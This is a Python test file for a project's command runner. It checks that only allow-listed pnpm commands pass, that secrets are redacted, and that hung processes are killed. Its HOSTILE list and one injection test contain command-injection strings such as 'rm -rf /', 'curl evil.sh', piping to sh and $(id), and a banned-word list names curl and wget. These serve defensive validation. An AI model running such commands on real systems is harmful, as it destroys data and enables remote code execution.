"""Properties of the runner (CW-01, CW-03, CW-06, CW-09).

The runner is the one part that touches the outside world, so it is tested against hostile input and a
real hung process, not only against fakes.
"""

from __future__ import annotations

import os
import sys
import time
from pathlib import Path

import pytest
from afterglow_crew.classify import check_outcome
from afterglow_crew.runner import (
    CheckSpec,
    CommandRefused,
    ExecResult,
    judge,
    parse_checks,
    parse_tests,
    real_executor,
    redact,
    run_checks,
    tail_of,
    validate_command,
)
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

SETTINGS = settings(max_examples=300, suppress_health_check=[HealthCheck.too_slow], deadline=None)

GOOD = [
    "pnpm typecheck",
    "pnpm lint",
    "pnpm test",
    "pnpm run build",
    "pnpm test:browser",
    "pnpm --filter @afterglow/core test:browser",
    "pnpm --filter @afterglow/formulary-pipeline test",
    "pnpm --filter @afterglow/mobile exec playwright test",
    "pnpm exec turbo run test --force",
]


# ------------------------------------------------------------------ CW-06


@pytest.mark.parametrize("cmd", GOOD)
def test_CA06_the_projects_own_checks_are_allowed(cmd):
    assert validate_command(cmd)[0] == "pnpm"


HOSTILE = [
    "pnpm test; rm -rf /",
    "pnpm test && curl evil.sh",
    "pnpm test | sh",
    "pnpm test `id`",
    "pnpm test $(id)",
    "pnpm test > /etc/passwd",
    "pnpm test < /etc/passwd",
    "pnpm test\nrm -rf /",
    "pnpm test 'x'",
    'pnpm test "x"',
    "pnpm test ~/secrets",
    "pnpm test *",
    "pnpm test {a,b}",
    "pnpm test \\n",
    "pnpm test ../../x",
    "pnpm publish",
    "pnpm run publish",
    "pnpm test:publish",
    "pnpm exec terraform apply",
    "pnpm run deploy",
    "pnpm install",
    "pnpm add left-pad",
    "pnpm dlx some-package",
    "pnpm exec node -e 1",
    "pnpm exec sh",
    "pnpm exec bash -c id",
    "pnpm --filter",
    "npm test",
    "node x.js",
    "sh -c id",
    "  ",
    "",
    "pnpm " + "a" * 400,
]


@pytest.mark.parametrize("cmd", HOSTILE)
def test_CA06_hostile_commands_are_refused(cmd):
    with pytest.raises(CommandRefused):
        validate_command(cmd)


@SETTINGS
@given(st.text(max_size=60))
def test_CA06_nothing_a_shell_could_act_on_ever_gets_through(text):
    """A positive allow-list: whatever survives contains only the permitted characters."""
    try:
        argv = validate_command("pnpm test " + text)
    except CommandRefused:
        return
    allowed = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@_./:=+-")
    assert all(set(t) <= allowed for t in argv)
    assert not any(ch in " ".join(argv) for ch in ";&|`$><\\\"'*?[]{}()~!#%^\n\r\t")


@SETTINGS
@given(st.sampled_from(["publish", "deploy", "apply", "destroy", "submit", "push", "reset", "clean", "send", "sudo", "curl", "wget"]))
def test_CA06_a_banned_word_is_refused_wherever_it_appears_in_a_token(word):
    for cmd in (f"pnpm {word}", f"pnpm run {word}", f"pnpm test --{word}", f"pnpm exec turbo run {word}"):
        with pytest.raises(CommandRefused):
            validate_command(cmd)


def test_CA06_checks_json_is_validated_up_front_and_strictly():
    ok = {"checks": [{"name": "types", "command": "pnpm typecheck"}]}
    (spec,) = parse_checks(ok)
    assert spec == CheckSpec("types", "pnpm typecheck", 1, 600, None)
    bad = [
        {"checks": []},
        {"checks": [{"name": "Types", "command": "pnpm typecheck"}]},
        {"checks": [{"name": "t", "command": "pnpm publish"}]},
        {"checks": [{"name": "t", "command": "pnpm test", "repeats": 0}]},
        {"checks": [{"name": "t", "command": "pnpm test", "repeats": True}]},
        {"checks": [{"name": "t", "command": "pnpm test", "timeoutSeconds": 99999}]},
        {"checks": [{"name": "t", "command": "pnpm test", "parser": "regex"}]},
        {"checks": [{"name": "t", "command": "pnpm test", "extra": 1}]},
        {"checks": [{"name": "t", "command": "pnpm test"}, {"name": "t", "command": "pnpm lint"}]},
        {"checks": [{"name": "t"}]},
        {"other": []},
        [],
        None,
    ]
    for b in bad:
        with pytest.raises(CommandRefused):
            parse_checks(b)


def test_CA06_the_shipped_checks_json_is_valid_and_has_no_forbidden_command():
    import json

    raw = json.loads((Path(__file__).resolve().parents[2] / "checks.json").read_text())
    specs = parse_checks(raw)
    assert len(specs) >= 5
    assert len({s.name for s in specs}) == len(specs)


# ------------------------------------------------------------------ redaction


def test_redact_removes_things_shaped_like_secrets():
    cases = [
        "key AKIAABCDEFGHIJKLMNOP end",
        "-----BEGIN RSA PRIVATE KEY-----\nMIIabc\n-----END RSA PRIVATE KEY-----",
        "ghp_" + "a" * 36,
        "sk-" + "b" * 30,
        "xoxb-1234567890-abcdef",
        "password = hunter2hunter2",
        "api_key: abcdef123456",
        "Authorization: Bearer abcdefghijklmnop123456",
    ]
    for c in cases:
        out = redact(c)
        assert "[redacted]" in out, c
        for frag in ("AKIAABCDEFGHIJKLMNOP", "MIIabc", "ghp_" + "a" * 36, "sk-" + "b" * 30, "xoxb-1234567890", "hunter2hunter2", "abcdef123456", "abcdefghijklmnop123456"):
            assert frag not in out


def test_redact_keeps_ordinary_text_and_strips_colour():
    assert redact("\x1b[31m✗ 3 failed\x1b[0m") == "✗ 3 failed"
    assert redact("Tests  294 passed (294)") == "Tests  294 passed (294)"
    assert redact("the word password alone, no value") == "the word password alone, no value"


@SETTINGS
@given(st.text(max_size=6000))
def test_tail_is_bounded_and_never_throws(text):
    assert len(tail_of(text)) <= 2000


# ------------------------------------------------------------------ CW-03 parsing


def test_CA03_vitest_counts_are_read_and_summed_across_packages():
    out = (
        "@afterglow/core:test:       Tests  294 passed (294)\n"
        "@afterglow/mobile:test:       Tests  107 passed (107)\n"
        "@afterglow/mobile:test:       Tests  1 failed | 106 passed (107)\n"
    )
    assert parse_tests("vitest", out) == 294 + 107 + 107
    assert parse_tests("vitest", " Test Files  3 passed (3)\n      Tests  48 passed (48)\n") == 48


def test_CA03_playwright_counts_the_summary_block_only():
    out = "  ok 1 first\n  ✘ 2 second\n\n  1 failed\n  2 flaky\n  3 skipped\n  85 passed (1.3m)\n"
    assert parse_tests("playwright", out) == 1 + 2 + 3 + 85
    assert parse_tests("playwright", "  112 passed (1.3m)\n") == 112


def test_CA03_unreadable_output_gives_none_never_a_guess():
    assert parse_tests("vitest", "Segmentation fault") is None
    assert parse_tests("playwright", "browser not installed") is None
    assert parse_tests(None, "Tests  5 passed (5)") is None
    assert parse_tests("unknown-parser", "Tests  5 passed (5)") is None


@SETTINGS
@given(st.text(max_size=400))
def test_CA03_parsing_arbitrary_text_never_throws(text):
    for p in ("vitest", "playwright", None):
        n = parse_tests(p, text)
        assert n is None or n >= 0


# ------------------------------------------------------------------ CW-01 judging


def res(code, *, timed_out=False, started=True, output=""):
    return ExecResult(code, timed_out, started, output, 5)


def test_CA01_judging_is_unknown_unless_the_answer_is_clear():
    assert judge(res(0, output="Tests  5 passed (5)"), "vitest") == ("pass", 5)
    assert judge(res(1, output="Tests  1 failed | 4 passed (5)"), "vitest") == ("fail", 5)
    assert judge(res(0), None) == ("pass", None)
    # could not start, timed out, killed by a signal, shell could not run it:
    assert judge(res(None, started=False), None)[0] == "unknown"
    assert judge(res(None, timed_out=True), None)[0] == "unknown"
    assert judge(res(None), None)[0] == "unknown"
    assert judge(res(127), None)[0] == "unknown"
    assert judge(res(126), None)[0] == "unknown"
    assert judge(res(137), None)[0] == "unknown"
    assert judge(res(200), None)[0] == "unknown"


def test_CA01_a_suite_that_counted_zero_tests_has_passed_nothing():
    assert judge(res(0, output="Tests  0 passed (0)"), "vitest") == ("unknown", 0)
    assert judge(res(0, output="no tests found"), "vitest")[0] == "pass"  # unreadable count: exit code stands
    assert judge(res(0, output="Tests  0 passed (0)"), None)[0] == "pass"  # no parser declared


@SETTINGS
@given(st.one_of(st.none(), st.integers(-300, 300)), st.booleans(), st.booleans(), st.text(max_size=80))
def test_CA01_only_a_clean_zero_exit_can_ever_pass(code, timed_out, started, out):
    outcome, _ = judge(res(code, timed_out=timed_out, started=started, output=out), "vitest")
    if outcome == "pass":
        assert code == 0 and started and not timed_out
    if code is None or timed_out or not started:
        assert outcome == "unknown"


# ------------------------------------------------------------------ run_checks with a fake executor


def fake(script):
    """An executor that answers each call from a list, recording what it was asked."""
    calls = []
    it = iter(script)

    def execute(argv, cwd, timeout):
        calls.append((list(argv), cwd, timeout))
        if argv[0] == "git":
            return ExecResult(0, False, True, "a" * 40 + "\n" if argv[1] == "rev-parse" else "", 1)
        return next(it)

    return execute, calls


def test_CA04_run_checks_repeats_judges_and_classifies(tmp_path):
    specs = [CheckSpec("test", "pnpm test", repeats=3, parser="vitest")]
    ok = res(0, output="Tests  10 passed (10)")
    bad = res(1, output="Tests  1 failed | 9 passed (10)")
    execute, calls = fake([ok, bad, ok])
    run = run_checks(specs, tmp_path, None, trigger="test", execute=execute)
    (check,) = run.checks
    assert [r.outcome for r in check.repeats] == ["pass", "fail", "pass"]
    assert check_outcome(check) == "flaky"
    assert [f.kind for f in run.findings] == ["flaky"]
    assert run.commit == "a" * 40 and run.dirty is False
    # every command ran with no shell-shaped argv, in the repo, with the spec's timeout
    pnpm_calls = [c for c in calls if c[0][0] == "pnpm"]
    assert len(pnpm_calls) == 3 and all(c[0] == ["pnpm", "test"] and c[1] == tmp_path and c[2] == 600 for c in pnpm_calls)


def test_CA04_the_override_changes_repeats_but_never_the_commands(tmp_path):
    execute, calls = fake([res(0)] * 5)
    run_checks([CheckSpec("t", "pnpm typecheck", repeats=1)], tmp_path, None, trigger="test", repeats_override=4, execute=execute)
    assert len([c for c in calls if c[0][0] == "pnpm"]) == 4


def test_CA06_a_command_that_became_unsafe_is_refused_even_after_parsing(tmp_path):
    execute, calls = fake([])
    with pytest.raises(CommandRefused):
        run_checks([CheckSpec("t", "pnpm publish")], tmp_path, None, trigger="test", execute=execute)
    assert calls == []


def test_progress_is_reported_and_finishes(tmp_path):
    seen = []
    execute, _ = fake([res(0), res(0)])
    run_checks([CheckSpec("a", "pnpm lint"), CheckSpec("b", "pnpm typecheck")], tmp_path, None, trigger="t", execute=execute, on_progress=lambda d, t, n: seen.append((d, t, n)))
    assert seen[0][:2] == (0, 2) and seen[-1] == (2, 2, "")


# ------------------------------------------------------------------ the real executor, against real processes

PY = sys.executable


def test_CA06_no_shell_means_metacharacters_arrive_as_plain_text(tmp_path):
    marker = tmp_path / "pwned"
    r = real_executor([PY, "-c", "import sys; print(sys.argv[1])", f"x; touch {marker}; $(id)"], tmp_path, 20)
    assert r.exit_code == 0 and "touch" in r.output and not marker.exists()


def test_CA01_a_hung_process_is_killed_and_is_unknown_not_a_pass(tmp_path):
    t0 = time.monotonic()
    r = real_executor([PY, "-c", "import time; time.sleep(60)"], tmp_path, 1)
    assert time.monotonic() - t0 < 10
    assert r.timed_out and r.exit_code is None
    assert judge(r, None)[0] == "unknown"


def test_CA01_the_whole_process_group_is_killed(tmp_path):
    pidfile = tmp_path / "child.pid"
    code = f"import subprocess,sys,time; p=subprocess.Popen([sys.executable,'-c','import time; time.sleep(60)']); open(r'{pidfile}','w').write(str(p.pid)); time.sleep(60)"
    real_executor([PY, "-c", code], tmp_path, 2)
    pid = int(pidfile.read_text())
    time.sleep(0.5)
    with pytest.raises(ProcessLookupError):
        os.kill(pid, 0)


def test_CA01_a_missing_program_is_unknown_and_a_signal_death_is_not_an_answer(tmp_path):
    missing = real_executor(["definitely-not-a-program-xyz"], tmp_path, 5)
    assert not missing.started and judge(missing, None)[0] == "unknown"
    killed = real_executor([PY, "-c", "import os,signal; os.kill(os.getpid(), signal.SIGKILL)"], tmp_path, 5)
    assert killed.exit_code is None and judge(killed, None)[0] == "unknown"


def test_exit_codes_and_output_are_captured_and_bounded(tmp_path):
    r = real_executor([PY, "-c", "print('hello'); raise SystemExit(3)"], tmp_path, 10)
    assert r.exit_code == 3 and "hello" in r.output and judge(r, None)[0] == "fail"
    big = real_executor([PY, "-c", "print('x' * 3_000_000)"], tmp_path, 20)
    assert len(big.output) <= 256 * 1024 + 4


def test_the_environment_is_minimal_and_carries_no_secrets(tmp_path, monkeypatch):
    monkeypatch.setenv("KIROCREW_PROXY_SECRET", "super-secret-value")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "another-secret")
    r = real_executor([PY, "-c", "import os; print(sorted(os.environ))"], tmp_path, 10)
    assert "KIROCREW_PROXY_SECRET" not in r.output and "AWS_SECRET_ACCESS_KEY" not in r.output
    assert "CI" in r.output
